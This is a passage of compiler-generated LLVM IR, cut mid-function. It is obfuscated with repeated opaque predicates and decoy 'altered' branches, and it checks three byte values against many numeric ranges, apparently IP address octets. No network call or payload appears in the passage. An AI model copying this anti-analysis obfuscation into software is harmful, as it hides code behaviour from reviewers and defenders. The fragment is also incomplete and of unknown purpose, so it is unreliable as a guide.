  br i1 %4598, label %4607, label %4631

; <label>:4607:                                   ; preds = %originalBBpart2644
  %4608 = load i8, i8* %12, align 1
  %4609 = zext i8 %4608 to i32
  %4610 = icmp sge i32 %4609, 208
  br i1 %4610, label %4611, label %4631

; <label>:4611:                                   ; preds = %4607
  %4612 = load i32, i32* @x.57
  %4613 = load i32, i32* @y.58
  %4614 = sub i32 %4612, 1
  %4615 = mul i32 %4612, %4614
  %4616 = urem i32 %4615, 2
  %4617 = icmp eq i32 %4616, 0
  %4618 = icmp slt i32 %4613, 10
  %4619 = or i1 %4617, %4618
  br i1 %4619, label %originalBB646, label %originalBB646alteredBB

originalBB646:                                    ; preds = %originalBB646alteredBB, %4611
  %4620 = load i8, i8* %12, align 1
  %4621 = zext i8 %4620 to i32
  %4622 = icmp slt i32 %4621, 223
  %4623 = load i32, i32* @x.57
  %4624 = load i32, i32* @y.58
  %4625 = sub i32 %4623, 1
  %4626 = mul i32 %4623, %4625
  %4627 = urem i32 %4626, 2
  %4628 = icmp eq i32 %4627, 0
  %4629 = icmp slt i32 %4624, 10
  %4630 = or i1 %4628, %4629
  br i1 %4630, label %originalBBpart2648, label %originalBB646alteredBB

originalBBpart2648:                               ; preds = %originalBB646
  br i1 %4622, label %5259, label %4631

; <label>:4631:                                   ; preds = %originalBBpart2648, %4607, %originalBBpart2644, %4583
  %4632 = load i8, i8* %10, align 1
  %4633 = zext i8 %4632 to i32
  %4634 = icmp eq i32 %4633, 107
  br i1 %4634, label %4635, label %4643

; <label>:4635:                                   ; preds = %4631
  %4636 = load i8, i8* %11, align 1
  %4637 = zext i8 %4636 to i32
  %4638 = icmp sge i32 %4637, 20
  br i1 %4638, label %4639, label %4643

; <label>:4639:                                   ; preds = %4635
  %4640 = load i8, i8* %11, align 1
  %4641 = zext i8 %4640 to i32
  %4642 = icmp slt i32 %4641, 24
  br i1 %4642, label %5259, label %4643

; <label>:4643:                                   ; preds = %4639, %4635, %4631
  %4644 = load i32, i32* @x.57
  %4645 = load i32, i32* @y.58
  %4646 = sub i32 %4644, 1
  %4647 = mul i32 %4644, %4646
  %4648 = urem i32 %4647, 2
  %4649 = icmp eq i32 %4648, 0
  %4650 = icmp slt i32 %4645, 10
  %4651 = or i1 %4649, %4650
  br i1 %4651, label %originalBB650, label %originalBB650alteredBB

originalBB650:                                    ; preds = %originalBB650alteredBB, %4643
  %4652 = load i8, i8* %10, align 1
  %4653 = zext i8 %4652 to i32
  %4654 = icmp eq i32 %4653, 35
  %4655 = load i32, i32* @x.57
  %4656 = load i32, i32* @y.58
  %4657 = sub i32 %4655, 1
  %4658 = mul i32 %4655, %4657
  %4659 = urem i32 %4658, 2
  %4660 = icmp eq i32 %4659, 0
  %4661 = icmp slt i32 %4656, 10
  %4662 = or i1 %4660, %4661
  br i1 %4662, label %originalBBpart2652, label %originalBB650alteredBB

originalBBpart2652:                               ; preds = %originalBB650
  br i1 %4654, label %4663, label %4687

; <label>:4663:                                   ; preds = %originalBBpart2652
  %4664 = load i8, i8* %11, align 1
  %4665 = zext i8 %4664 to i32
  %4666 = icmp sge i32 %4665, 159
  br i1 %4666, label %4667, label %4687

; <label>:4667:                                   ; preds = %4663
  %4668 = load i32, i32* @x.57
  %4669 = load i32, i32* @y.58
  %4670 = sub i32 %4668, 1
  %4671 = mul i32 %4668, %4670
  %4672 = urem i32 %4671, 2
  %4673 = icmp eq i32 %4672, 0
  %4674 = icmp slt i32 %4669, 10
  %4675 = or i1 %4673, %4674
  br i1 %4675, label %originalBB654, label %originalBB654alteredBB

originalBB654:                                    ; preds = %originalBB654alteredBB, %4667
  %4676 = load i8, i8* %11, align 1
  %4677 = zext i8 %4676 to i32
  %4678 = icmp slt i32 %4677, 183
  %4679 = load i32, i32* @x.57
  %4680 = load i32, i32* @y.58
  %4681 = sub i32 %4679, 1
  %4682 = mul i32 %4679, %4681
  %4683 = urem i32 %4682, 2
  %4684 = icmp eq i32 %4683, 0
  %4685 = icmp slt i32 %4680, 10
  %4686 = or i1 %4684, %4685
  br i1 %4686, label %originalBBpart2656, label %originalBB654alteredBB

originalBBpart2656:                               ; preds = %originalBB654
  br i1 %4678, label %5259, label %4687

; <label>:4687:                                   ; preds = %originalBBpart2656, %4663, %originalBBpart2652
  %4688 = load i8, i8* %10, align 1
  %4689 = zext i8 %4688 to i32
  %4690 = icmp eq i32 %4689, 52
  br i1 %4690, label %4691, label %4699

; <label>:4691:                                   ; preds = %4687
  %4692 = load i8, i8* %11, align 1
  %4693 = zext i8 %4692 to i32
  %4694 = icmp sge i32 %4693, 1
  br i1 %4694, label %4695, label %4699

; <label>:4695:                                   ; preds = %4691
  %4696 = load i8, i8* %11, align 1
  %4697 = zext i8 %4696 to i32
  %4698 = icmp slt i32 %4697, 95
  br i1 %4698, label %5259, label %4699

; <label>:4699:                                   ; preds = %4695, %4691, %4687
  %4700 = load i8, i8* %10, align 1
  %4701 = zext i8 %4700 to i32
  %4702 = icmp eq i32 %4701, 52
  br i1 %4702, label %4703, label %4727

; <label>:4703:                                   ; preds = %4699
  %4704 = load i32, i32* @x.57
  %4705 = load i32, i32* @y.58
  %4706 = sub i32 %4704, 1
  %4707 = mul i32 %4704, %4706
  %4708 = urem i32 %4707, 2
  %4709 = icmp eq i32 %4708, 0
  %4710 = icmp slt i32 %4705, 10
  %4711 = or i1 %4709, %4710
  br i1 %4711, label %originalBB658, label %originalBB658alteredBB

originalBB658:                                    ; preds = %originalBB658alteredBB, %4703
  %4712 = load i8, i8* %11, align 1
  %4713 = zext i8 %4712 to i32
  %4714 = icmp sge i32 %4713, 95
  %4715 = load i32, i32* @x.57
  %4716 = load i32, i32* @y.58
  %4717 = sub i32 %4715, 1
  %4718 = mul i32 %4715, %4717
  %4719 = urem i32 %4718, 2
  %4720 = icmp eq i32 %4719, 0
  %4721 = icmp slt i32 %4716, 10
  %4722 = or i1 %4720, %4721
  br i1 %4722, label %originalBBpart2660, label %originalBB658alteredBB

originalBBpart2660:                               ; preds = %originalBB658
  br i1 %4714, label %4723, label %4727

; <label>:4723:                                   ; preds = %originalBBpart2660
  %4724 = load i8, i8* %11, align 1
  %4725 = zext i8 %4724 to i32
  %4726 = icmp slt i32 %4725, 255
  br i1 %4726, label %5259, label %4727

; <label>:4727:                                   ; preds = %4723, %originalBBpart2660, %4699
  %4728 = load i32, i32* @x.57
  %4729 = load i32, i32* @y.58
  %4730 = sub i32 %4728, 1
  %4731 = mul i32 %4728, %4730
  %4732 = urem i32 %4731, 2
  %4733 = icmp eq i32 %4732, 0
  %4734 = icmp slt i32 %4729, 10
  %4735 = or i1 %4733, %4734
  br i1 %4735, label %originalBB662, label %originalBB662alteredBB

originalBB662:                                    ; preds = %originalBB662alteredBB, %4727
  %4736 = load i8, i8* %10, align 1
  %4737 = zext i8 %4736 to i32
  %4738 = icmp eq i32 %4737, 54
  %4739 = load i32, i32* @x.57
  %4740 = load i32, i32* @y.58
  %4741 = sub i32 %4739, 1
  %4742 = mul i32 %4739, %4741
  %4743 = urem i32 %4742, 2
  %4744 = icmp eq i32 %4743, 0
  %4745 = icmp slt i32 %4740, 10
  %4746 = or i1 %4744, %4745
  br i1 %4746, label %originalBBpart2664, label %originalBB662alteredBB

originalBBpart2664:                               ; preds = %originalBB662
  br i1 %4738, label %4747, label %4755

; <label>:4747:                                   ; preds = %originalBBpart2664
  %4748 = load i8, i8* %11, align 1
  %4749 = zext i8 %4748 to i32
  %4750 = icmp sge i32 %4749, 64
  br i1 %4750, label %4751, label %4755

; <label>:4751:                                   ; preds = %4747
  %4752 = load i8, i8* %11, align 1
  %4753 = zext i8 %4752 to i32
  %4754 = icmp slt i32 %4753, 95
  br i1 %4754, label %5259, label %4755

; <label>:4755:                                   ; preds = %4751, %4747, %originalBBpart2664
  %4756 = load i32, i32* @x.57
  %4757 = load i32, i32* @y.58
  %4758 = sub i32 %4756, 1
  %4759 = mul i32 %4756, %4758
  %4760 = urem i32 %4759, 2
  %4761 = icmp eq i32 %4760, 0
  %4762 = icmp slt i32 %4757, 10
  %4763 = or i1 %4761, %4762
  br i1 %4763, label %originalBB666, label %originalBB666alteredBB

originalBB666:                                    ; preds = %originalBB666alteredBB, %4755
  %4764 = load i8, i8* %10, align 1
  %4765 = zext i8 %4764 to i32
  %4766 = icmp eq i32 %4765, 54
  %4767 = load i32, i32* @x.57
  %4768 = load i32, i32* @y.58
  %4769 = sub i32 %4767, 1
  %4770 = mul i32 %4767, %4769
  %4771 = urem i32 %4770, 2
  %4772 = icmp eq i32 %4771, 0
  %4773 = icmp slt i32 %4768, 10
  %4774 = or i1 %4772, %4773
  br i1 %4774, label %originalBBpart2668, label %originalBB666alteredBB

originalBBpart2668:                               ; preds = %originalBB666
  br i1 %4766, label %4775, label %4815

; <label>:4775:                                   ; preds = %originalBBpart2668
  %4776 = load i32, i32* @x.57
  %4777 = load i32, i32* @y.58
  %4778 = sub i32 %4776, 1
  %4779 = mul i32 %4776, %4778
  %4780 = urem i32 %4779, 2
  %4781 = icmp eq i32 %4780, 0
  %4782 = icmp slt i32 %4777, 10
  %4783 = or i1 %4781, %4782
  br i1 %4783, label %originalBB670, label %originalBB670alteredBB

originalBB670:                                    ; preds = %originalBB670alteredBB, %4775
  %4784 = load i8, i8* %11, align 1
  %4785 = zext i8 %4784 to i32
  %4786 = icmp sge i32 %4785, 144
  %4787 = load i32, i32* @x.57
  %4788 = load i32, i32* @y.58
  %4789 = sub i32 %4787, 1
  %4790 = mul i32 %4787, %4789
  %4791 = urem i32 %4790, 2
  %4792 = icmp eq i32 %4791, 0
  %4793 = icmp slt i32 %4788, 10
  %4794 = or i1 %4792, %4793
  br i1 %4794, label %originalBBpart2672, label %originalBB670alteredBB

originalBBpart2672:                               ; preds = %originalBB670
  br i1 %4786, label %4795, label %4815

; <label>:4795:                                   ; preds = %originalBBpart2672
  %4796 = load i32, i32* @x.57
  %4797 = load i32, i32* @y.58
  %4798 = sub i32 %4796, 1
  %4799 = mul i32 %4796, %4798
  %4800 = urem i32 %4799, 2
  %4801 = icmp eq i32 %4800, 0
  %4802 = icmp slt i32 %4797, 10
  %4803 = or i1 %4801, %4802
  br i1 %4803, label %originalBB674, label %originalBB674alteredBB

originalBB674:                                    ; preds = %originalBB674alteredBB, %4795
  %4804 = load i8, i8* %11, align 1
  %4805 = zext i8 %4804 to i32
  %4806 = icmp slt i32 %4805, 255
  %4807 = load i32, i32* @x.57
  %4808 = load i32, i32* @y.58
  %4809 = sub i32 %4807, 1
  %4810 = mul i32 %4807, %4809
  %4811 = urem i32 %4810, 2
  %4812 = icmp eq i32 %4811, 0
  %4813 = icmp slt i32 %4808, 10
  %4814 = or i1 %4812, %4813
  br i1 %4814, label %originalBBpart2676, label %originalBB674alteredBB

originalBBpart2676:                               ; preds = %originalBB674
  br i1 %4806, label %5259, label %4815

; <label>:4815:                                   ; preds = %originalBBpart2676, %originalBBpart2672, %originalBBpart2668
  %4816 = load i32, i32* @x.57
  %4817 = load i32, i32* @y.58
  %4818 = sub i32 %4816, 1
  %4819 = mul i32 %4816, %4818
  %4820 = urem i32 %4819, 2
  %4821 = icmp eq i32 %4820, 0
  %4822 = icmp slt i32 %4817, 10
  %4823 = or i1 %4821, %4822
  br i1 %4823, label %originalBB678, label %originalBB678alteredBB

originalBB678:                                    ; preds = %originalBB678alteredBB, %4815
  %4824 = load i8, i8* %10, align 1
  %4825 = zext i8 %4824 to i32
  %4826 = icmp eq i32 %4825, 13
  %4827 = load i32, i32* @x.57
  %4828 = load i32, i32* @y.58
  %4829 = sub i32 %4827, 1
  %4830 = mul i32 %4827, %4829
  %4831 = urem i32 %4830, 2
  %4832 = icmp eq i32 %4831, 0
  %4833 = icmp slt i32 %4828, 10
  %4834 = or i1 %4832, %4833
  br i1 %4834, label %originalBBpart2680, label %originalBB678alteredBB

originalBBpart2680:                               ; preds = %originalBB678
  br i1 %4826, label %4835, label %4843

; <label>:4835:                                   ; preds = %originalBBpart2680
  %4836 = load i8, i8* %11, align 1
  %4837 = zext i8 %4836 to i32
  %4838 = icmp sge i32 %4837, 52
  br i1 %4838, label %4839, label %4843

; <label>:4839:                                   ; preds = %4835
  %4840 = load i8, i8* %11, align 1
  %4841 = zext i8 %4840 to i32
  %4842 = icmp slt i32 %4841, 60
  br i1 %4842, label %5259, label %4843

; <label>:4843:                                   ; preds = %4839, %4835, %originalBBpart2680
  %4844 = load i8, i8* %10, align 1
  %4845 = zext i8 %4844 to i32
  %4846 = icmp eq i32 %4845, 13
  br i1 %4846, label %4847, label %4871

; <label>:4847:                                   ; preds = %4843
  %4848 = load i8, i8* %11, align 1
  %4849 = zext i8 %4848 to i32
  %4850 = icmp sge i32 %4849, 112
  br i1 %4850, label %4851, label %4871

; <label>:4851:                                   ; preds = %4847
  %4852 = load i32, i32* @x.57
  %4853 = load i32, i32* @y.58
  %4854 = sub i32 %4852, 1
  %4855 = mul i32 %4852, %4854
  %4856 = urem i32 %4855, 2
  %4857 = icmp eq i32 %4856, 0
  %4858 = icmp slt i32 %4853, 10
  %4859 = or i1 %4857, %4858
  br i1 %4859, label %originalBB682, label %originalBB682alteredBB

originalBB682:                                    ; preds = %originalBB682alteredBB, %4851
  %4860 = load i8, i8* %11, align 1
  %4861 = zext i8 %4860 to i32
  %4862 = icmp slt i32 %4861, 115
  %4863 = load i32, i32* @x.57
  %4864 = load i32, i32* @y.58
  %4865 = sub i32 %4863, 1
  %4866 = mul i32 %4863, %4865
  %4867 = urem i32 %4866, 2
  %4868 = icmp eq i32 %4867, 0
  %4869 = icmp slt i32 %4864, 10
  %4870 = or i1 %4868, %4869
  br i1 %4870, label %originalBBpart2684, label %originalBB682alteredBB

originalBBpart2684:                               ; preds = %originalBB682
  br i1 %4862, label %5259, label %4871

; <label>:4871:                                   ; preds = %originalBBpart2684, %4847, %4843
  %4872 = load i32, i32* @x.57
  %4873 = load i32, i32* @y.58
  %4874 = sub i32 %4872, 1
  %4875 = mul i32 %4872, %4874
  %4876 = urem i32 %4875, 2
  %4877 = icmp eq i32 %4876, 0
  %4878 = icmp slt i32 %4873, 10
  %4879 = or i1 %4877, %4878
  br i1 %4879, label %originalBB686, label %originalBB686alteredBB

originalBB686:                                    ; preds = %originalBB686alteredBB, %4871
  %4880 = load i8, i8* %10, align 1
  %4881 = zext i8 %4880 to i32
  %4882 = icmp eq i32 %4881, 163
  %4883 = load i32, i32* @x.57
  %4884 = load i32, i32* @y.58
  %4885 = sub i32 %4883, 1
  %4886 = mul i32 %4883, %4885
  %4887 = urem i32 %4886, 2
  %4888 = icmp eq i32 %4887, 0
  %4889 = icmp slt i32 %4884, 10
  %4890 = or i1 %4888, %4889
  br i1 %4890, label %originalBBpart2688, label %originalBB686alteredBB

originalBBpart2688:                               ; preds = %originalBB686
  br i1 %4882, label %4891, label %4895

; <label>:4891:                                   ; preds = %originalBBpart2688
  %4892 = load i8, i8* %11, align 1
  %4893 = zext i8 %4892 to i32
  %4894 = icmp eq i32 %4893, 172
  br i1 %4894, label %5259, label %4895

; <label>:4895:                                   ; preds = %4891, %originalBBpart2688
  %4896 = load i8, i8* %10, align 1
  %4897 = zext i8 %4896 to i32
  %4898 = icmp eq i32 %4897, 51
  br i1 %4898, label %4899, label %4907

; <label>:4899:                                   ; preds = %4895
  %4900 = load i8, i8* %11, align 1
  %4901 = zext i8 %4900 to i32
  %4902 = icmp sge i32 %4901, 15
  br i1 %4902, label %4903, label %4907

; <label>:4903:                                   ; preds = %4899
  %4904 = load i8, i8* %11, align 1
  %4905 = zext i8 %4904 to i32
  %4906 = icmp slt i32 %4905, 255
  br i1 %4906, label %5259, label %4907

; <label>:4907:                                   ; preds = %4903, %4899, %4895
  %4908 = load i8, i8* %10, align 1
  %4909 = zext i8 %4908 to i32
  %4910 = icmp eq i32 %4909, 79
  br i1 %4910, label %4911, label %4939

; <label>:4911:                                   ; preds = %4907
  %4912 = load i8, i8* %11, align 1
  %4913 = zext i8 %4912 to i32
  %4914 = icmp eq i32 %4913, 121
  br i1 %4914, label %4915, label %4939

; <label>:4915:                                   ; preds = %4911
  %4916 = load i8, i8* %12, align 1
  %4917 = zext i8 %4916 to i32
  %4918 = icmp sge i32 %4917, 128
  br i1 %4918, label %4919, label %4939

; <label>:4919:                                   ; preds = %4915
  %4920 = load i32, i32* @x.57
  %4921 = load i32, i32* @y.58
  %4922 = sub i32 %4920, 1
  %4923 = mul i32 %4920, %4922
  %4924 = urem i32 %4923, 2
  %4925 = icmp eq i32 %4924, 0
  %4926 = icmp slt i32 %4921, 10
  %4927 = or i1 %4925, %4926
  br i1 %4927, label %originalBB690, label %originalBB690alteredBB

originalBB690:                                    ; preds = %originalBB690alteredBB, %4919
  %4928 = load i8, i8* %12, align 1
  %4929 = zext i8 %4928 to i32
  %4930 = icmp slt i32 %4929, 255
  %4931 = load i32, i32* @x.57
  %4932 = load i32, i32* @y.58
  %4933 = sub i32 %4931, 1
  %4934 = mul i32 %4931, %4933
  %4935 = urem i32 %4934, 2
  %4936 = icmp eq i32 %4935, 0
  %4937 = icmp slt i32 %4932, 10
  %4938 = or i1 %4936, %4937
  br i1 %4938, label %originalBBpart2692, label %originalBB690alteredBB

originalBBpart2692:                               ; preds = %originalBB690
  br i1 %4930, label %5259, label %4939

; <label>:4939:                                   ; preds = %originalBBpart2692, %4915, %4911, %4907
  %4940 = load i8, i8* %10, align 1
  %4941 = zext i8 %4940 to i32
  %4942 = icmp eq i32 %4941, 212
  br i1 %4942, label %4943, label %4971

; <label>:4943:                                   ; preds = %4939
  %4944 = load i8, i8* %11, align 1
  %4945 = zext i8 %4944 to i32
  %4946 = icmp eq i32 %4945, 47
  br i1 %4946, label %4947, label %4971

; <label>:4947:                                   ; preds = %4943
  %4948 = load i8, i8* %12, align 1
  %4949 = zext i8 %4948 to i32
  %4950 = icmp sge i32 %4949, 224
  br i1 %4950, label %4951, label %4971

; <label>:4951:                                   ; preds = %4947
  %4952 = load i32, i32* @x.57
  %4953 = load i32, i32* @y.58
  %4954 = sub i32 %4952, 1
  %4955 = mul i32 %4952, %4954
  %4956 = urem i32 %4955, 2
  %4957 = icmp eq i32 %4956, 0
  %4958 = icmp slt i32 %4953, 10
  %4959 = or i1 %4957, %4958
  br i1 %4959, label %originalBB694, label %originalBB694alteredBB

originalBB694:                                    ; preds = %originalBB694alteredBB, %4951
  %4960 = load i8, i8* %12, align 1
  %4961 = zext i8 %4960 to i32
  %4962 = icmp slt i32 %4961, 255
  %4963 = load i32, i32* @x.57
  %4964 = load i32, i32* @y.58
  %4965 = sub i32 %4963, 1
  %4966 = mul i32 %4963, %4965
  %4967 = urem i32 %4966, 2
  %4968 = icmp eq i32 %4967, 0
  %4969 = icmp slt i32 %4964, 10
  %4970 = or i1 %4968, %4969
  br i1 %4970, label %originalBBpart2696, label %originalBB694alteredBB

originalBBpart2696:                               ; preds = %originalBB694
  br i1 %4962, label %5259, label %4971

; <label>:4971:                                   ; preds = %originalBBpart2696, %4947, %4943, %4939
  %4972 = load i32, i32* @x.57
  %4973 = load i32, i32* @y.58
  %4974 = sub i32 %4972, 1
  %4975 = mul i32 %4972, %4974
  %4976 = urem i32 %4975, 2
  %4977 = icmp eq i32 %4976, 0
  %4978 = icmp slt i32 %4973, 10
  %4979 = or i1 %4977, %4978
  br i1 %4979, label %originalBB698, label %originalBB698alteredBB

originalBB698:                                    ; preds = %originalBB698alteredBB, %4971
  %4980 = load i8, i8* %10, align 1
  %4981 = zext i8 %4980 to i32
  %4982 = icmp eq i32 %4981, 89
  %4983 = load i32, i32* @x.57
  %4984 = load i32, i32* @y.58
  %4985 = sub i32 %4983, 1
  %4986 = mul i32 %4983, %4985
  %4987 = urem i32 %4986, 2
  %4988 = icmp eq i32 %4987, 0
  %4989 = icmp slt i32 %4984, 10
  %4990 = or i1 %4988, %4989
  br i1 %4990, label %originalBBpart2700, label %originalBB698alteredBB

originalBBpart2700:                               ; preds = %originalBB698
  br i1 %4982, label %4991, label %5035

; <label>:4991:                                   ; preds = %originalBBpart2700
  %4992 = load i32, i32* @x.57
  %4993 = load i32, i32* @y.58
  %4994 = sub i32 %4992, 1
  %4995 = mul i32 %4992, %4994
  %4996 = urem i32 %4995, 2
  %4997 = icmp eq i32 %4996, 0
  %4998 = icmp slt i32 %4993, 10
  %4999 = or i1 %4997, %4998
  br i1 %4999, label %originalBB702, label %originalBB702alteredBB

originalBB702:                                    ; preds = %originalBB702alteredBB, %4991
  %5000 = load i8, i8* %11, align 1
  %5001 = zext i8 %5000 to i32
  %5002 = icmp eq i32 %5001, 34
  %5003 = load i32, i32* @x.57
  %5004 = load i32, i32* @y.58
  %5005 = sub i32 %5003, 1
  %5006 = mul i32 %5003, %5005
  %5007 = urem i32 %5006, 2
  %5008 = icmp eq i32 %5007, 0
  %5009 = icmp slt i32 %5004, 10
  %5010 = or i1 %5008, %5009
  br i1 %5010, label %originalBBpart2704, label %originalBB702alteredBB

originalBBpart2704:                               ; preds = %originalBB702
  br i1 %5002, label %5011, label %5035

; <label>:5011:                                   ; preds = %originalBBpart2704
  %5012 = load i8, i8* %12, align 1
  %5013 = zext i8 %5012 to i32
  %5014 = icmp sge i32 %5013, 96
  br i1 %5014, label %5015, label %5035

; <label>:5015:                                   ; preds = %5011
  %5016 = load i32, i32* @x.57
  %5017 = load i32, i32* @y.58
  %5018 = sub i32 %5016, 1
  %5019 = mul i32 %5016, %5018
  %5020 = urem i32 %5019, 2
  %5021 = icmp eq i32 %5020, 0
  %5022 = icmp slt i32 %5017, 10
  %5023 = or i1 %5021, %5022
  br i1 %5023, label %originalBB706, label %originalBB706alteredBB

originalBB706:                                    ; preds = %originalBB706alteredBB, %5015
  %5024 = load i8, i8* %12, align 1
  %5025 = zext i8 %5024 to i32
  %5026 = icmp slt i32 %5025, 97
  %5027 = load i32, i32* @x.57
  %5028 = load i32, i32* @y.58
  %5029 = sub i32 %5027, 1
  %5030 = mul i32 %5027, %5029
  %5031 = urem i32 %5030, 2
  %5032 = icmp eq i32 %5031, 0
  %5033 = icmp slt i32 %5028, 10
  %5034 = or i1 %5032, %5033
  br i1 %5034, label %originalBBpart2708, label %originalBB706alteredBB

originalBBpart2708:                               ; preds = %originalBB706
  br i1 %5026, label %5259, label %5035

; <label>:5035:                                   ; preds = %originalBBpart2708, %5011, %originalBBpart2704, %originalBBpart2700
  %5036 = load i8, i8* %10, align 1
  %5037 = zext i8 %5036 to i32
  %5038 = icmp eq i32 %5037, 219
  br i1 %5038, label %5039, label %5063

; <label>:5039:                                   ; preds = %5035
  %5040 = load i32, i32* @x.57
  %5041 = load i32, i32* @y.58
  %5042 = sub i32 %5040, 1
  %5043 = mul i32 %5040, %5042
  %5044 = urem i32 %5043, 2
  %5045 = icmp eq i32 %5044, 0
  %5046 = icmp slt i32 %5041, 10
  %5047 = or i1 %5045, %5046
  br i1 %5047, label %originalBB710, label %originalBB710alteredBB

originalBB710:                                    ; preds = %originalBB710alteredBB, %5039
  %5048 = load i8, i8* %11, align 1
  %5049 = zext i8 %5048 to i32
  %5050 = icmp sge i32 %5049, 216
  %5051 = load i32, i32* @x.57
  %5052 = load i32, i32* @y.58
  %5053 = sub i32 %5051, 1
  %5054 = mul i32 %5051, %5053
  %5055 = urem i32 %5054, 2
  %5056 = icmp eq i32 %5055, 0
  %5057 = icmp slt i32 %5052, 10
  %5058 = or i1 %5056, %5057
  br i1 %5058, label %originalBBpart2712, label %originalBB710alteredBB

originalBBpart2712:                               ; preds = %originalBB710
  br i1 %5050, label %5059, label %5063

; <label>:5059:                                   ; preds = %originalBBpart2712
  %5060 = load i8, i8* %11, align 1
  %5061 = zext i8 %5060 to i32
  %5062 = icmp slt i32 %5061, 231
  br i1 %5062, label %5259, label %5063

; <label>:5063:                                   ; preds = %5059, %originalBBpart2712, %5035
  %5064 = load i8, i8* %10, align 1
  %5065 = zext i8 %5064 to i32
  %5066 = icmp eq i32 %5065, 23
  br i1 %5066, label %5067, label %5075

; <label>:5067:                                   ; preds = %5063
  %5068 = load i8, i8* %11, align 1
  %5069 = zext i8 %5068 to i32
  %5070 = icmp sge i32 %5069, 94
  br i1 %5070, label %5071, label %5075

; <label>:5071:                                   ; preds = %5067
  %5072 = load i8, i8* %11, align 1
  %5073 = zext i8 %5072 to i32
  %5074 = icmp slt i32 %5073, 109
  br i1 %5074, label %5259, label %5075

; <label>:5075:                                   ; preds = %5071, %5067, %5063
  %5076 = load i32, i32* @x.57
  %5077 = load i32, i32* @y.58
  %5078 = sub i32 %5076, 1
  %5079 = mul i32 %5076, %5078
  %5080 = urem i32 %5079, 2
  %5081 = icmp eq i32 %5080, 0
  %5082 = icmp slt i32 %5077, 10
  %5083 = or i1 %5081, %5082
  br i1 %5083, label %originalBB714, label %originalBB714alteredBB

originalBB714:                                    ; preds = %originalBB714alteredBB, %5075
  %5084 = load i8, i8* %10, align 1
  %5085 = zext i8 %5084 to i32
  %5086 = icmp eq i32 %5085, 178
  %5087 = load i32, i32* @x.57
  %5088 = load i32, i32* @y.58
  %5089 = sub i32 %5087, 1
  %5090 = mul i32 %5087, %5089
  %5091 = urem i32 %5090, 2
  %5092 = icmp eq i32 %5091, 0
  %5093 = icmp slt i32 %5088, 10
  %5094 = or i1 %5092, %5093
  br i1 %5094, label %originalBBpart2716, label %originalBB714alteredBB

originalBBpart2716:                               ; preds = %originalBB714
  br i1 %5086, label %5095, label %5103

; <label>:5095:                                   ; preds = %originalBBpart2716
  %5096 = load i8, i8* %11, align 1
  %5097 = zext i8 %5096 to i32
  %5098 = icmp sge i32 %5097, 62
  br i1 %5098, label %5099, label %5103

; <label>:5099:                                   ; preds = %5095
  %5100 = load i8, i8* %11, align 1
  %5101 = zext i8 %5100 to i32
  %5102 = icmp slt i32 %5101, 63
  br i1 %5102, label %5259, label %5103

; <label>:5103:                                   ; preds = %5099, %5095, %originalBBpart2716
  %5104 = load i8, i8* %10, align 1
  %5105 = zext i8 %5104 to i32
  %5106 = icmp eq i32 %5105, 106
  br i1 %5106, label %5107, label %5115

; <label>:5107:                                   ; preds = %5103
  %5108 = load i8, i8* %11, align 1
  %5109 = zext i8 %5108 to i32
  %5110 = icmp sge i32 %5109, 182
  br i1 %5110, label %5111, label %5115

; <label>:5111:                                   ; preds = %5107
  %5112 = load i8, i8* %11, align 1
  %5113 = zext i8 %5112 to i32
  %5114 = icmp slt i32 %5113, 189
  br i1 %5114, label %5259, label %5115

; <label>:5115:                                   ; preds = %5111, %5107, %5103
  %5116 = load i8, i8* %10, align 1
  %5117 = zext i8 %5116 to i32
  %5118 = icmp eq i32 %5117, 34
  br i1 %5118, label %5119, label %5127

; <label>:5119:                                   ; preds = %5115
  %5120 = load i8, i8* %11, align 1
  %5121 = zext i8 %5120 to i32
  %5122 = icmp sge i32 %5121, 245
  br i1 %5122, label %5123, label %5127

; <label>:5123:                                   ; preds = %5119
  %5124 = load i8, i8* %11, align 1
  %5125 = zext i8 %5124 to i32
  %5126 = icmp slt i32 %5125, 255
  br i1 %5126, label %5259, label %5127

; <label>:5127:                                   ; preds = %5123, %5119, %5115
  %5128 = load i8, i8* %10, align 1
  %5129 = zext i8 %5128 to i32
  %5130 = icmp eq i32 %5129, 87
  br i1 %5130, label %5131, label %5155

; <label>:5131:                                   ; preds = %5127
  %5132 = load i32, i32* @x.57
  %5133 = load i32, i32* @y.58
  %5134 = sub i32 %5132, 1
  %5135 = mul i32 %5132, %5134
  %5136 = urem i32 %5135, 2
  %5137 = icmp eq i32 %5136, 0
  %5138 = icmp slt i32 %5133, 10
  %5139 = or i1 %5137, %5138
  br i1 %5139, label %originalBB718, label %originalBB718alteredBB

originalBB718:                                    ; preds = %originalBB718alteredBB, %5131
  %5140 = load i8, i8* %11, align 1
  %5141 = zext i8 %5140 to i32
  %5142 = icmp sge i32 %5141, 97
  %5143 = load i32, i32* @x.57
  %5144 = load i32, i32* @y.58
  %5145 = sub i32 %5143, 1
  %5146 = mul i32 %5143, %5145
  %5147 = urem i32 %5146, 2
  %5148 = icmp eq i32 %5147, 0
  %5149 = icmp slt i32 %5144, 10
  %5150 = or i1 %5148, %5149
  br i1 %5150, label %originalBBpart2720, label %originalBB718alteredBB

originalBBpart2720:                               ; preds = %originalBB718
  br i1 %5142, label %5151, label %5155

; <label>:5151:                                   ; preds = %originalBBpart2720
  %5152 = load i8, i8* %11, align 1
  %5153 = zext i8 %5152 to i32
  %5154 = icmp slt i32 %5153, 99
  br i1 %5154, label %5259, label %5155

; <label>:5155:                                   ; preds = %5151, %originalBBpart2720, %5127
  %5156 = load i32, i32* @x.57
  %5157 = load i32, i32* @y.58
  %5158 = sub i32 %5156, 1
  %5159 = mul i32 %5156, %5158
  %5160 = urem i32 %5159, 2
  %5161 = icmp eq i32 %5160, 0
  %5162 = icmp slt i32 %5157, 10
  %5163 = or i1 %5161, %5162
  br i1 %5163, label %originalBB722, label %originalBB722alteredBB

originalBB722:                                    ; preds = %originalBB722alteredBB, %5155
  %5164 = load i8, i8* %10, align 1
  %5165 = zext i8 %5164 to i32
  %5166 = icmp eq i32 %5165, 86
  %5167 = load i32, i32* @x.57
  %5168 = load i32, i32* @y.58
  %5169 = sub i32 %5167, 1
  %5170 = mul i32 %5167, %5169
  %5171 = urem i32 %5170, 2
  %5172 = icmp eq i32 %5171, 0
  %5173 = icmp slt i32 %5168, 10
  %5174 = or i1 %5172, %5173
  br i1 %5174, label %originalBBpart2724, label %originalBB722alteredBB

originalBBpart2724:                               ; preds = %originalBB722
  br i1 %5166, label %5175, label %5195

; <label>:5175:                                   ; preds = %originalBBpart2724
  %5176 = load i32, i32* @x.57
  %5177 = load i32, i32* @y.58
  %5178 = sub i32 %5176, 1
  %5179 = mul i32 %5176, %5178
